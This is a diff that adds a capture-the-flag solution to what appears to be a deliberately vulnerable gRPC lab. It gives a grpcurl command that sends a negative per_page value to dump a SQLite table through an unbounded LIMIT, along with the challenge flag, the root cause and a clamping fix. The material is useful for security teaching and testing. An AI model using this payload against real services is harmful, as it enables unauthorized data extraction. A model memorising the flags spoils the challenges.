@@ -302,3 +302,32 @@ See [`challenges/11-timing-attack/README.md`](../challenges/11-timing-attack/).
 **Flag:** `FLAG{unb0und3d_str34m_3xh4usts_th3_s3rv3r}`
 
 See [`challenges/12-streaming-dos/README.md`](../challenges/12-streaming-dos/).
+
+---
+
+## Challenge 13 — Integer Overflow / Unvalidated Pagination
+
+**Flag:** `FLAG{int3g3r_b0unds_n0t_v4l1d4t3d}`
+
+### Exploit
+```bash
+grpcurl -plaintext -d '{"query":"","page":0,"per_page":-1}' \
+  localhost:50051 dvgrpc.ProductService/PaginatedSearch
+```
+SQLite treats `LIMIT -1` as "no limit", so this single call dumps the
+whole `products` table — including a hidden "premium" row whose
+`description` field contains the flag.
+
+### Root cause
+`per_page` is taken from the request without bounds checks; the value
+flows straight into the SQL LIMIT clause.
+
+### Mitigation
+```python
+MAX_PER_PAGE = 100
+per_page = max(1, min(request.per_page or 20, MAX_PER_PAGE))
+page     = max(0, request.page)
+```
+Prefer cursor-based pagination for anything user-facing.
+
+See [`challenges/13-integer-overflow/README.md`](../challenges/13-integer-overflow/).
